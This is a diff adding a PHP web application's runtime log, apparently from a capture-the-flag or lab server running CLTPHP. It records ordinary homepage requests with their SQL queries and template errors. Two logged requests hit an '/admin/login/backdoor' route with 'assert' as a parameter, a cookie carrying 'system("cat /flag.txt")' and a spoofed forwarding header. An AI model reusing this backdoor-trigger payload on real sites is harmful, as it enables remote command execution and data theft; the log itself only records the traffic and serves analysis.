@@ -1,0 +1,204 @@
+---------------------------------------------------------------
+[ 2018-06-15T06:05:02+08:00 ] 172.16.1.23 GET /
+[ info ] 172.16.1.22/ [运行时间：0.173292s][吞吐率：5.77req/s] [内存消耗：696.25kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '172.16.1.22',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
+  'dnt' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
+  'cookie' => 'PHPSESSID=07rer22qeoqa8utkhsaodve852',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\home\controller\Index->index[ /var/www/html/app/home/controller/Index.php ]
+[ info ] [ VIEW ] /var/www/html/app/home/view/index_index.html [ array (
+  0 => 'sys',
+  1 => 'action',
+  2 => 'controller',
+  3 => 'title',
+  4 => 'keywords',
+  5 => 'description',
+  6 => 'category',
+  7 => 'adList',
+  8 => 'linkList',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002565s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_category` [ RunTime:0.017810s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000715s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `parentid` = 0  AND `ismenu` = 1 ORDER BY `listorder` [ RunTime:0.004017s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `ismenu` = 1 ORDER BY `listorder` [ RunTime:0.000624s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_ad` [ RunTime:0.002023s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_ad` WHERE  `type_id` = 1  AND `open` = 1 ORDER BY sort asc LIMIT 4 [ RunTime:0.000948s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_link` [ RunTime:0.001783s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_link` WHERE  `open` = 1 ORDER BY sort asc [ RunTime:0.000890s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_article` [ RunTime:0.002225s ]
+[ sql ] [ SQL ] SELECT `a`.*,`c`.`catdir` FROM `clt_article` `a` LEFT JOIN `clt_category` `c` ON `a`.`catid`=`c`.`id` WHERE  (  posid = 1 ) ORDER BY listorder asc,createtime desc LIMIT 4 [ RunTime:0.002941s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_debris` [ RunTime:0.001734s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_debris` WHERE  (  type_id = 1 ) LIMIT 3 [ RunTime:0.000829s ]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:11]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:12]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:13]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+---------------------------------------------------------------
+[ 2018-06-15T13:12:53+08:00 ] 8.8.8.8 GET /admin/login/backdoor?hongkexueyuan=assert
+[ info ] 172.20.117.101/admin/login/backdoor?hongkexueyuan=assert [运行时间：0.067505s][吞吐率：14.81req/s] [内存消耗：337.52kb] [文件加载：39]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'backdoor',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '172.20.117.101',
+  'user-agent' => 'python-requests/2.18.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'x-forwarded-for' => '8.8.8.8',
+  'cookie' => 'cmd=system("cat /flag.txt")',
+)
+[ info ] [ PARAM ] array (
+  'hongkexueyuan' => 'assert',
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->backdoor[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-06-15T13:13:22+08:00 ] 8.8.8.8 GET /admin/login/backdoor?hongkexueyuan=assert
+[ info ] 172.20.117.101/admin/login/backdoor?hongkexueyuan=assert [运行时间：0.013278s][吞吐率：75.31req/s] [内存消耗：269.32kb] [文件加载：39]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'backdoor',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '172.20.117.101',
+  'user-agent' => 'python-requests/2.18.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'x-forwarded-for' => '8.8.8.8',
+  'cookie' => 'cmd=system("cat /flag.txt")',
+)
+[ info ] [ PARAM ] array (
+  'hongkexueyuan' => 'assert',
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->backdoor[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-06-15T13:25:55+08:00 ] 172.20.117.2 GET /
+[ info ] 172.20.117.101/ [运行时间：0.079558s][吞吐率：12.57req/s] [内存消耗：565.42kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '172.20.117.101',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\home\controller\Index->index[ /var/www/html/app/home/controller/Index.php ]
+[ info ] [ VIEW ] /var/www/html/app/home/view/index_index.html [ array (
+  0 => 'sys',
+  1 => 'action',
+  2 => 'controller',
+  3 => 'title',
+  4 => 'keywords',
+  5 => 'description',
+  6 => 'category',
+  7 => 'adList',
+  8 => 'linkList',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001059s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_category` [ RunTime:0.020175s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000706s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `parentid` = 0  AND `ismenu` = 1 ORDER BY `listorder` [ RunTime:0.002065s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `ismenu` = 1 ORDER BY `listorder` [ RunTime:0.000571s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_ad` [ RunTime:0.001404s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_ad` WHERE  `type_id` = 1  AND `open` = 1 ORDER BY sort asc LIMIT 4 [ RunTime:0.000772s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_link` [ RunTime:0.001435s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_link` WHERE  `open` = 1 ORDER BY sort asc [ RunTime:0.000673s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_article` [ RunTime:0.001632s ]
+[ sql ] [ SQL ] SELECT `a`.*,`c`.`catdir` FROM `clt_article` `a` LEFT JOIN `clt_category` `c` ON `a`.`catid`=`c`.`id` WHERE  (  posid = 1 ) ORDER BY listorder asc,createtime desc LIMIT 4 [ RunTime:0.001717s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_debris` [ RunTime:0.001392s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_debris` WHERE  (  type_id = 1 ) LIMIT 3 [ RunTime:0.000612s ]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:11]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:12]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:13]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
